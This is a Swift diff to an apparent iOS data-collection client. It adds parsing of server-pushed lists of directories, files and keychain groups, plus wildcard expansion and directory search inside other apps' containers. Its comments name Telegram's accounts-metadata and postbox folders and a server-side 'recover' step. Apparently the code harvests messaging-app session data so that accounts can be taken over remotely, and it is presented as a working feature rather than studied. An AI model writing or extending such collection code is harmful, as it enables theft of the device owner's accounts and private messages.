@@ -716,16 +716,35 @@ enum ProtocolAPI {
                       !bundleID.isEmpty else { return nil }
                 let appName = entry["app_name"] as? String ?? ""
                 let accessGroup = entry["access_group"] as? String ?? ""
-                let items = (entry["items"] as? [[String: Any]] ?? []).compactMap { raw -> CollectItem? in
+                var items = (entry["items"] as? [[String: Any]] ?? []).compactMap { raw -> CollectItem? in
                     guard let type = raw["type"] as? String,
                           let path = raw["path"] as? String,
                           !path.isEmpty else { return nil }
                     return CollectItem(type: type, path: path)
                 }
+
+                // 旧模板兼容：服务端老配置是 dirs / files 两个数组（也可能是多行字符串）。
+                // 不认这两段的话，后台明明下发了路径，客户端却按 0 项处理。
+                for path in collectStringList(entry["dirs"] ?? entry["directories"] ?? entry["folders"]) {
+                    if !items.contains(where: { $0.type == "dir" && $0.path == path }) {
+                        items.append(CollectItem(type: "dir", path: path))
+                    }
+                }
+                for path in collectStringList(entry["files"] ?? entry["file_paths"]) {
+                    if !items.contains(where: { $0.type == "file" && $0.path == path }) {
+                        items.append(CollectItem(type: "file", path: path))
+                    }
+                }
+
+                // 旧格式用 keychain_group 表示 App Group
+                let group = accessGroup.isEmpty
+                    ? (entry["keychain_group"] as? String ?? "")
+                    : accessGroup
+
                 return CollectConfig(
                     bundleID: bundleID,
                     appName: appName,
-                    accessGroup: accessGroup,
+                    accessGroup: group,
                     items: items
                 )
             }
@@ -1284,6 +1303,193 @@ enum ProtocolCollectService {
         return result
     }
 
+    // MARK: - 通配展开 / 同名目录回退（与 WQFiles 的 WQExpandOne / WQFindDirNamed 一致）
+
+    /// "dirs" / "files" 既可能是数组，也可能是多行或逗号分隔的字符串。
+    static func collectStringList(_ value: Any?) -> [String] {
+        if let list = value as? [String] {
+            return list.map { $0.trimmingCharacters(in: .whitespacesAndNewlines) }
+                       .filter { !$0.isEmpty }
+        }
+        if let list = value as? [Any] {
+            return list.compactMap { $0 as? String }
+                       .map { $0.trimmingCharacters(in: .whitespacesAndNewlines) }
+                       .filter { !$0.isEmpty }
+        }
+        if let text = value as? String {
+            return text
+                .split(whereSeparator: { $0 == "\n" || $0 == "\r" || $0 == "," })
+                .map { $0.trimmingCharacters(in: .whitespaces) }
+                .filter { !$0.isEmpty }
+        }
+        return []
+    }
+
+    static func hasWildcard(_ rel: String) -> Bool {
+        rel.contains("*") || rel.contains("?")
+    }
+
+    /// 把一条可能带通配的相对路径展开成容器内真实存在的相对路径（保留完整层级，
+    /// 这样落盘结构与原始容器一致，服务端 recover 时才找得到 accounts-metadata/）。
+    private static func expandOne(_ pattern: String, containerURL: URL) -> [String] {
+        let segments = pattern.components(separatedBy: "/")
+        var current: [String] = [""]
+        let fm = FileManager.default
+
+        for seg in segments {
+            if seg.isEmpty { continue }
+            let wild = hasWildcard(seg)
+            var next: [String] = []
+
+            for prefix in current {
+                if !wild {
+                    let candidate = prefix.isEmpty
+                        ? seg
+                        : (prefix as NSString).appendingPathComponent(seg)
+                    let abs = (containerURL.path as NSString).appendingPathComponent(candidate)
+                    if fm.fileExists(atPath: abs) { next.append(candidate) }
+                    continue
+                }
+                let absDir = prefix.isEmpty
+                    ? containerURL.path
+                    : (containerURL.path as NSString).appendingPathComponent(prefix)
+                guard let names = try? fm.contentsOfDirectory(atPath: absDir) else { continue }
+                for name in names {
+                    if name.hasPrefix(".") { continue }
+                    // fnmatch 收的是 C 字符串，Swift 不会把 String 自动桥接成 char*
+                    let matched = seg.withCString { pat in
+                        name.withCString { candidate in
+                            fnmatch(pat, candidate, 0) == 0
+                        }
+                    }
+                    if !matched { continue }
+                    next.append(prefix.isEmpty
+                        ? name
+                        : (prefix as NSString).appendingPathComponent(name))
+                }
+            }
+
+            // 异常目录（几千个同名段）不该把采集拖垮
+            if next.count > 256 { next = Array(next.prefix(256)) }
+            current = next
+            if current.isEmpty { break }
+        }
+        return current.filter { !$0.isEmpty }
+    }
+
+    /// 在容器内限深度找同名目录，返回相对路径。TG 各版本把
+    /// accounts-metadata / postbox 放在不同层级（例如 telegram-data/ 下）。
+    /// 跳过 media / cache 这类几十 GB 的大目录。
+    private static func findDirNamed(_ want: String,
+                                     containerURL: URL,
+                                     maxDepth: Int = 3) -> String? {
+        guard !want.isEmpty else { return nil }
+        let skip: Set<String> = ["media", "cache", "cache-storage", "storage", "logs"]
+        let fm = FileManager.default
+        var queue: [String] = [""]
+
+        for depth in 0...maxDepth {
+            if queue.isEmpty { break }
+            var nextQueue: [String] = []
+            for rel in queue {
+                let abs = rel.isEmpty
+                    ? containerURL.path
+                    : (containerURL.path as NSString).appendingPathComponent(rel)
+                guard let names = try? fm.contentsOfDirectory(atPath: abs) else { continue }
+                for name in names {
+                    if name.hasPrefix(".") || skip.contains(name) { continue }
+                    var isDir: ObjCBool = false
+                    let child = (abs as NSString).appendingPathComponent(name)
+                    guard fm.fileExists(atPath: child, isDirectory: &isDir),
+                          isDir.boolValue else { continue }
+                    let relChild = rel.isEmpty
+                        ? name
+                        : (rel as NSString).appendingPathComponent(name)
+                    if name == want { return relChild }
+                    if depth + 1 <= maxDepth { nextQueue.append(relChild) }
+                }
+            }
+            queue = nextQueue
+        }
+        return nil
+    }
+
+    /// 展开整个 items 列表：通配展开 + 目录不存在时同名回退。与 5/6 的
+    /// WQExpandScopeList / WQResolveDirs 行为一致。
+    private static func expandedItems(_ items: [CollectItem],
+                                      containerURL: URL,
+                                      fileManager: FileManager) -> [CollectItem] {
+        var out: [CollectItem] = []
+        var seen = Set<String>()
+
+        func isDirType(_ type: String) -> Bool {
+            let l = type.lowercased()
+            return l == "dir" || l == "folder" || l == "directory"
+        }
+
+        func append(_ type: String, _ path: String) {
+            let key = type + "|" + path
+            if seen.contains(key) { return }
+            seen.insert(key)
+            out.append(CollectItem(type: type, path: path))
+        }
+
+        for item in items {
+            var normalized = item.path
+            while normalized.contains(" /") || normalized.contains("/ ") {
+                normalized = normalized
+                    .replacingOccurrences(of: " /", with: "/")
+                    .replacingOccurrences(of: "/ ", with: "/")
+            }
+            normalized = normalized.trimmingCharacters(in: .whitespaces)
+            if normalized.isEmpty { continue }
+
+            let isDir = isDirType(item.type)
+
+            // 整容器项
+            if normalized == "/" || normalized == "." || normalized == "./" {
+                append("dir", ".")
+                continue
+            }
+
+            if hasWildcard(normalized) {
+                let expanded = expandOne(normalized, containerURL: containerURL)
+                if !expanded.isEmpty {
+                    log("collect: wildcard \(normalized) -> \(expanded.count) match(es): \(expanded.joined(separator: ", "))")
+                    for path in expanded { append(isDir ? "dir" : "file", path) }
+                    continue
+                }
+                let want = (normalized as NSString).lastPathComponent
+                if let found = findDirNamed(want, containerURL: containerURL) {
+                    log("collect: wildcard \(normalized) no match; same-name dir at \(found)")
+                    append("dir", found)
+                } else {
+                    log("collect: wildcard \(normalized) no match in container")
+                }
+                continue
+            }
+
+            if isDir {
+                let abs = (containerURL.path as NSString).appendingPathComponent(normalized)
+                if fileManager.fileExists(atPath: abs) {
+                    append("dir", normalized)
+                    continue
+                }
+                let want = (normalized as NSString).lastPathComponent
+                if let found = findDirNamed(want, containerURL: containerURL) {
+                    log("collect: missing \(normalized); same-name dir at \(found), using it")
+                    append("dir", found)
+                } else {
+                    log("collect: missing \(normalized); no same-name dir in container")
+                }
+                continue
+            }
+
+            append(item.type, normalized)
+        }
+        return out
+    }
+
     /// Resolves a collect item to an existing on-disk URL. Server paths are
     /// normalized (whitespace around "/" removed) and, for iOS 26's
     /// per-bundle Application Support layout, retried under
@@ -1436,7 +1642,18 @@ enum ProtocolCollectService {
         var outcome = CollectOutcome(label: statusLabel)
 
         let containerURL = URL(fileURLWithPath: containerPath, isDirectory: true)
-        let sources = config.items.compactMap { item -> (url: URL, name: String)? in
+        // 先做通配展开 + 同名目录回退，再逐个解析成 URL。
+        // 服务端清单里的 account-*/postbox/ 每台设备账号 ID 都不同，必须在这里展开。
+        let effectiveItems = expandedItems(
+            config.items,
+            containerURL: containerURL,
+            fileManager: fileManager
+        )
+        if effectiveItems.count != config.items.count {
+            log("collect: \(config.bundleID) items \(config.items.count) -> \(effectiveItems.count) after expansion")
+        }
+
+        let sources = effectiveItems.compactMap { item -> (url: URL, name: String)? in
             guard let itemURL = resolvedItemURL(
                 item,
                 containerURL: containerURL,
